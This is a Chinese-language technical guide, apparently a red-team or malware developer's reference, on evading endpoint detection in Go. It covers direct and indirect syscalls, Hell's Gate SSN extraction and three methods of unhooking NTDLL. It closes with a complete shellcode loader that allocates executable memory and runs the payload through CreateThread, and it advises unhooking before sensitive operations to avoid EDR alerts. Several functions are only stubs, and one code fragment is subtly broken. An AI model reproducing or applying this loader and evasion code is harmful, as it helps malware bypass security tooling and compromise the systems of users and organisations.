# 直接/间接系统调用 & NTDLL脱钩

## ⚠️ 致命警告：syscall.SyscallN不能直接调用shellcode

**绝对不要这样做：**
```go
// ❌ 这会导致程序崩溃！
syscall.SyscallN(shellcodeAddr)
syscall.SyscallN(addr)  // 直接调用shellcode地址 = 崩溃
```

**原因：**
- syscall.SyscallN在调用前会修改栈状态（设置参数、保存寄存器）
- Shellcode期望干净的栈环境（无额外参数）
- 直接调用会导致栈状态异常，shellcode执行失败或程序崩溃

**正确用法：**
```go
// ✓ syscall.SyscallN用于调用NT API函数
syscall.SyscallN(NtAllocateVirtualMemory.Addr(), ...)

// ✓ shellcode执行必须通过CreateThread创建线程
thread, _, _ := syscall.SyscallN(CreateThread.Addr(), 0, 0, addr, 0, 0, 0)
syscall.SyscallN(WaitForSingleObject.Addr(), thread, 0xFFFFFFFF)
```

**执行方式对比：**

| 方式 | 结果 | 说明 |
|------|------|------|
| syscall.SyscallN(shellcodeAddr) | **崩溃** | ❌ 绝对禁止 |
| CreateThread(shellcodeAddr) | ✅ 正常 | ✓ 推荐使用 |
| syscall.SyscallN(CreateThread.Addr(), ..., shellcodeAddr) | ✅ 正常 | ✓ 推荐 |

---

## 1. 直接系统调用

**原理：**
- 获取SSN（System Service Number）
- 直接调用syscall指令
- 绕过用户层API Hook

**syscall stub结构：**
```
ntdll!NtAllocateVirtualMemory:
0000: mov r10, rcx          ; 保存第一个参数
0004: mov eax, <SSN>        ; 系统调用号
0008: syscall               ; 执行系统调用
000A: ret                   ; 返回
```

**Go实现：**
```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

// 重要：Go不支持内联汇编！
// 直接syscall需要汇编支持，在Go中使用以下替代方案：
// 1. 使用syscall.SyscallN调用NT函数地址
// 2. 使用windows.NewLazySystemDLL方式
// 3. 创建.s汇编文件（复杂）

// Go推荐方式：使用syscall.SyscallN调用NTDLL函数
func NtAllocateVirtualMemoryGo(ProcessHandle uintptr, BaseAddress *uintptr,
    ZeroBits uintptr, RegionSize *uintptr, AllocationType uint32, Protect uint32) uintptr {

    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")

    status, _, _ := syscall.SyscallN(NtAllocateVirtualMemory.Addr(),
        ProcessHandle,
        uintptr(unsafe.Pointer(BaseAddress)),
        ZeroBits,
        uintptr(unsafe.Pointer(RegionSize)),
        uintptr(AllocationType),
        uintptr(Protect))

    return status
}

// SSN提取（用于验证/脱钩检测）
func getSSN(funcName string) uint32 {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)

    // 读取syscall stub
    stub := (*[23]byte)(unsafe.Pointer(proc.Addr()))

    // 解析 mov eax, <SSN> 指令
    // x64: B8 <SSN 4字节>
    if stub[0] == 0xB8 {
        return uint32(stub[1]) | uint32(stub[2])<<8 | uint32(stub[3])<<16 | uint32(stub[4])<<24
    }

    // 处理被Hook的情况（可能被patch为jmp）
    return extractSSNFromHook(stub)
}
```

---

## 2. Hell's Gate

**原理：**
- 运行时解析NTDLL stub
- 提取真实的SSN
- 处理被Hook的情况

**Go实现：**
```go
// Hell's Gate: 从被Hook的NTDLL中提取SSN
func hellsgateGetSSN(funcName string) uint32 {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)
    
    stub := (*[23]byte)(unsafe.Pointer(proc.Addr()))
    
    // 检查是否被Hook（前几个字节被patch）
    if stub[0] == 0xE9 || stub[0] == 0xEB { // jmp指令
        // 被Hook了，需要从干净的NTDLL获取SSN
        return getSSNFromCleanNTDLL(funcName)
    }
    
    // 正常情况，解析stub
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 { // mov r10, rcx
        if stub[4] == 0xB8 { // mov eax, <SSN>
            return uint32(stub[5]) | uint32(stub[6])<<8 | uint32(stub[7])<<16 | uint32(stub[8])<<24
        }
    }
    
    return 0
}

// 从干净的NTDLL获取SSN
func getSSNFromCleanNTDLL(funcName string) uint32 {
    // 方案1: 从磁盘读取NTDLL
    // 方案2: 从KnownDlls读取
    // 方案3: 从挂起进程读取
    return unhookAndGetSSN(funcName)
}
```

---

## 3. 间接系统调用

**原理：**
- 通过NTDLL中的合法地址跳转
- 保留syscall指令在NTDLL中执行
- 隐藏调用来源

**Go实现：**
```go
// 间接syscall：跳转到NTDLL中的syscall指令地址
func indirectSyscall(funcName string, args ...uintptr) uintptr {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)
    
    // 获取syscall指令地址（stub中的syscall位置）
    stub := proc.Addr()
    syscallAddr := stub + 8 // syscall指令在mov eax之后
    
    // 准备参数
    // 跳转到syscallAddr执行
    // ...
}
```

---

## 4. HellsHall

**原理：**
- Hell's Gate + Halo's Gate
- 更高级的SSN提取技术
- 处理多层Hook

**Go实现：**
```go
// HellsHall: 高级syscall技术
func hellshall(funcName string, args ...uintptr) uintptr {
    // 1. 检测Hook状态
    // 2. 提取SSN
    // 3. 找到干净的syscall指令地址
    // 4. 间接调用
}
```

---

## 5. NTDLL脱钩

### 5.1 从磁盘恢复

**原理：**
- 读取磁盘上的ntdll.dll
- 解析干净的代码段
- 写回内存

**Go实现：**
```go
func unhookNtdllFromDisk() {
    // 读取磁盘上的ntdll.dll
    ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
    data, err := os.ReadFile(ntdllPath)
    if err != nil {
        return
    }
    
    // 解析PE结构
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&data[0]))
    ntHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&data[dosHeader.E_lfanew]))
    
    // 获取代码段
    codeSection := getSectionByName(data, ".text")
    
    // 获取当前进程NTDLL基址
    ntdllBase := getModuleHandleByPEB("ntdll.dll")
    
    // 写回干净的代码
    writeMemory(ntdllBase + uintptr(codeSection.VirtualAddress), 
        data[codeSection.PointerToRawData:], codeSection.SizeOfRawData)
}
```

### 5.2 从KnownDlls恢复

**原理：**
- 使用\KnownDlls\ntdll.dll Section
- Section映射获取干净代码
- 不读取磁盘文件

**Go实现：**
```go
func unhookNtdllFromKnownDlls() {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    // 打开KnownDlls Section
    sectionName, _ := windows.UTF16PtrFromString("\\KnownDlls\\ntdll.dll")
    
    // NtOpenSection
    // NtMapViewOfSection
    // 复制干净代码到当前NTDLL
}
```

### 5.3 从挂起进程恢复

**原理：**
- 创建挂起进程
- 从新进程读取干净的NTDLL
- 恢复到当前进程

**Go实现：**
```go
func unhookNtdllFromSuspendedProcess() {
    // 创建挂起进程（如cmd.exe）
    cmdPath := "C:\\Windows\\System32\\cmd.exe"
    
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    windows.CreateProcess(cmdPath, nil, nil, nil, false, 0x4, nil, nil, &si, &pi)
    
    // 获取新进程NTDLL基址
    newNtdllBase := getRemoteModuleBase(pi.Process, "ntdll.dll")
    
    // 读取干净代码
    cleanCode := readRemoteMemory(pi.Process, newNtdllBase, codeSize)
    
    // 写回当前进程
    currentNtdllBase := getModuleHandleByPEB("ntdll.dll")
    writeMemory(currentNtdllBase, cleanCode, codeSize)
    
    // 终止挂起进程
    windows.TerminateProcess(pi.Process, 0)
}
```

---

## 重要警告：syscall.SyscallN不能直接调用shellcode！

**错误方式：**
```go
// ❌ 错误：直接用syscall.SyscallN调用shellcode地址
syscall.SyscallN(addr)  // 这会导致崩溃！
```

**原因：**
- syscall.SyscallN在调用时会修改栈状态
- Shellcode期望干净的栈环境
- 直接调用可能导致shellcode执行失败或崩溃

**正确方式：**
```go
// ✓ 正确：syscall.SyscallN用于调用NT函数，但shellcode执行必须用CreateThread
// 1. 使用syscall.SyscallN调用NtAllocateVirtualMemory分配内存
syscall.SyscallN(NtAllocateVirtualMemory.Addr(), ...)

// 2. 使用CreateThread创建线程执行shellcode（稳定）
thread := syscall.SyscallN(CreateThread.Addr(), 0, 0, addr, 0, 0, 0)
syscall.SyscallN(WaitForSingleObject.Addr(), thread, 0xFFFFFFFF)
```

---

## 完整正确示例

```go
func executeShellcodeCorrect(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    // syscall.SyscallN用于调用NT函数
    NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

    // 1. 分配内存（使用syscall调用NT函数）
    var baseAddr uintptr
    var size uintptr = uintptr(len(sc))
    syscall.SyscallN(NtAllocateVirtualMemory.Addr(),
        uintptr(windows.CurrentProcess()),
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&size)),
        0x3000,
        0x40)

    // 2. 复制shellcode
    syscall.SyscallN(RtlMoveMemory.Addr(), baseAddr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // 3. 创建线程执行（必须用CreateThread，不能直接syscall.SyscallN(addr)）
    thread, _, _ := syscall.SyscallN(CreateThread.Addr(), 0, 0, baseAddr, 0, 0, 0)

    // 4. 等待执行完成
    syscall.SyscallN(WaitForSingleObject.Addr(), thread, 0xFFFFFFFF)
}
```

---

## 执行方式对比

| 方式 | 稳定性 | 说明 |
|------|--------|------|
| syscall.SyscallN(addr) 直接调用shellcode | **崩溃** | ❌ 不能用 |
| CreateThread + WaitForSingleObject | 高 | ✓ 推荐 |
| syscall.SyscallN调用NT函数 + CreateThread执行 | 高 | ✓ 推荐 |

---

## 6. Syscall替代函数

| NT函数 | Win32替代 | 说明 |
|--------|----------|------|
| NtAllocateVirtualMemory | VirtualAlloc | 分配内存 |
| NtWriteVirtualMemory | WriteProcessMemory | 写入内存 |
| NtProtectVirtualMemory | VirtualProtect | 修改内存保护 |
| NtCreateThreadEx | CreateThread/CreateRemoteThread | 创建线程 |
| NtQueueApcThreadEx2 | QueueUserAPC | APC注入 |
| NtOpenProcess | OpenProcess | 打开进程 |
| NtOpenThread | OpenThread | 打开线程 |
| NtSuspendThread | SuspendThread | 挂起线程 |
| NtResumeThread | ResumeThread | 恢复线程 |
| NtTerminateProcess | TerminateProcess | 终止进程 |

---

## 注意事项

1. **SSN变化**：不同Windows版本的SSN可能不同，需要动态提取
2. **Hook检测**：检测jmp/call指令判断是否被Hook
3. **脱钩时机**：在执行敏感操作前脱钩
4. **权限问题**：脱钩需要写入权限，可能触发EDR报警